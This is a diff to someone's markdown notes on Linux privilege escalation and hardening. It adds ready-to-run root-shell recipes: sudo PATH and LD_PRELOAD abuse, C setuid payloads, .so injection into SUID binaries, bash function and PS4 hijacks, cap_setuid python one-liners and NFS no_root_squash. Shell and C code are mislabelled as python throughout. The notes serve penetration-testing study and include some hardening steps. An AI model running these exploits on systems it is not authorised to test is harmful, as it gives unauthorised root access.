@@ -42,42 +42,43 @@ rpm -qa #Centos
 
 ## GTFOBins & GTFOArgs
 [GTFOBins](https://gtfobins.github.io/)
+
 [GTFOArgs](https://gtfoargs.github.io/)
 
 ## Sudo abuses
 List user's privileges or check a specific
-```cmd
+```python
 sudo -l
 ```
 ### NOPASSWD
 Sudo configuration might allow a user to execute some command with another user's privileges without knowing the password.
-```cmd
+```python
 $ sudo -l
 User khoadan may run the following commands on test:
     (root) NOPASSWD: /usr/bin/vim
 ```
 ### SETEVN
 This flag allows user to set environment variables when running the specified command.
-```cmd
+```python
 User khoadan may run the following commands on test:
     (ALL) SETENV: /opt/scripts/tasks.py
 ```
 **Exploit**
 PYTHONPATH is used by Python to determine which directories to look in for modules to import.
-```cmd
+```python
 sudo PYTHONPATH=/dev/mal/ /opt/scripts/tasks.py
 ```
 Also use LD_PRELOAD variable
-## Sudo command without path
+### Sudo command without path
 When a single command such as ```ls```, ```cat``` have sudo permission. User can exploit it to get root by changing PATH.
-```cmd
+```python
 export PATH=/tmp:$PATH
 #Creat script "ls" in /tmp
 cp /bin/bash /tmp/ls
 chmod +x /tmp/ls
 sudo ls
 ```
-## LD_PRELOAD & LD_LIBRARY_PATH
+### LD_PRELOAD
 LD_PRELOAD is an optional Environment Variable that is used to set/load Shared Libraries to a program or script.
 **Exploit**
 - Permission to set LD_PRELOAD Environment Variables for a program.
@@ -95,22 +96,31 @@ void _init() {
     system("/bin/bash");
 }
 ```
-```cmd
+```python
 gcc -fPIC -shared -o /tmp/exploit.so exploit.c -nostartfiles
 sudo LD_PRELOAD=/tmp/exploit.so ls
 ```
 
-### SUID
+## SUID
 SUID or GUID, when set, allows the process to execute under the specified user or group.
 List all binary with suid/guid:
-```cmd
+```python
 find / -perm -4000 -ls 2>/dev/null
 find / -perm -u=s -ls 2>/dev/null
 find / -perm -2000 -ls 2>/dev/null
 find / -perm -g=s -ls 2>/dev/null
 ```
+[GTFOBins & GTFOArgs]()
 
 Code: exploit.c
+```C++
+int main() {
+    setgid(0);
+    setuid(0);
+    system("/bin/bash");
+    return 0;
+}
+```
 ```C++
 #define _GNU_SOURCE
 #include <stdlib.h>
@@ -122,17 +132,82 @@ int main(void) {
     return 0;
 }
 ```
+### SUID Binary – .so injection
+Check all system calls made by a SUID (Set User ID) binary can provide insights into its behavior, particularly which files it attempts to access.
+```python
+strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
+```
+Example output
+```python
+open("/etc/ld.so.cache", O_RDONLY) = 3
+open("/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
+access("/home/user/.config/libcalc.so", R_OK) = -1 ENOENT (No such file or directory)
+```
+Pay attention to non -existing files in writable directory to perform privileged escalation.
+**Exploit**
+Code: libcalc.c
+```python
+#include <stdio.h>
+#include <stdlib.h>
+static void inject() __attribute__((constructor));
+void inject(){
+    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
+}
+```
+```python
+gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c
+./<SUID-BINARY>
+```
 
+### SUID binary without command path
+Check suid binary with strings to see command execute.
+```python
+#-rwsr-sr-x    root    root    /home/check
+strings /home/check
+#service start nginx
+```
+**Exploit**
+```python
+echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c
+gcc /tmp/service.c -o /tmp/service
+export PATH=/tmp:$PATH
+/home/check
+```
+### SUID binary with command path
+Check suid binary with strings to see command execute.
+```python
+#-rwsr-sr-x    root    root    /home/check
+strings /home/check
+# /usr/sbin/service start nginx
+```
+**Exploit** (only work with old linux version)
+```python
+function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
+export -f /usr/sbin/service
+/home/check
+```
+```python
+env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp && chown root.root /tmp/bash && chmod +s /tmp/bash)' /bin/sh -c '/home/check; set +x; /tmp/bash -p'
+```
 
 ## Shared Object Hijacking
 
 ## Capabilities
+File capabilities are a more fine-grained approach to granting specific privileges to executables than the traditional SUID (Set User ID) bit. The cap_setuid capability, for instance, allows a process to change its user ID, which is traditionally the function of SUID-root programs.
+```python
+getcap -r 2>/dev/null| grep cap_setuid
+#/usr/bin/python2.6 = cap_setuid+ep
+```
+**Exploit**
+```python
+/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+```
 
 ## ACLs
 
 ## NFS no_root_squash/no_all_squash misconfiguration PE
 This is a misconfiguration in the NFS configuration. If the options no_root_squash or no_all_squash are found in ```/etc/exports```, then you can access it from a client and write inside that directory as if you were the local root of the machine.
-```cmd
+```python
 #Attacker, as root user
 mkdir /tmp/pe
 mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
@@ -144,7 +219,7 @@ chmod +s bash
 cd <SHAREDD_FOLDER>
 ./bash -p #ROOT shell
 ```
-Or use a **C SUID payloads** (see in [euid, ruid, suid]())
+Or use a **C SUID payloads** (see in [SUID]())
 
 [NFS_privesc](https://www.errno.fr/nfs_privesc.html)
 
@@ -155,7 +230,7 @@ Or use a **C SUID payloads** (see in [euid, ruid, suid]())
 ## Access control
 ### Unix traditional model
 1. Change default usmask for the shell to 0077.
-```cmd
+```python
 echo  'umask 0077' >> /etc/profile'
 ```
 Change default usmask for services to 0027. Thit value can be defined directly in configuration file of the service **(UMask=0027)**.
@@ -163,7 +238,7 @@ Change default usmask for services to 0027. Thit value can be defined directly i
 [Understanding UMASK value](https://www.cyberciti.biz/tips/understanding-linux-unix-umask-value-usage.html)
 
 2. Create a group and ony member in this group can run sudo
-```cmd
+```python
 chmod 760 /usr/bin/sudo
 ```
 3. Sudo configuration guidelines (edit /etc/sudoers)
@@ -179,7 +254,7 @@ chmod 760 /usr/bin/sudo
 
 4. Restrict the normal user to run only limited set of commands
 - Using restricted shell
-```cmd
+```python
 # create the restricted shell
 cp /bin/bash /bin/rbash
 # modify the target user
@@ -196,12 +271,12 @@ usermod -s /bin/rbash {username}
 ### Named ipc, sockets or pipes
 ### Access rights
 1. Avoiding files or dir without a known user.
-```cmd
+```python
 find / \( -nouser -o nogroup \) -ls 2>/dev/null
 ```
 2. Set **sticky bit**
 3. Ignores setuid / setgid bits and exec right (especial root rights). 
-```cmd
+```python
 chmod 744 {filename}
 chmod u-s {filename}
 chmod g-s {filename}
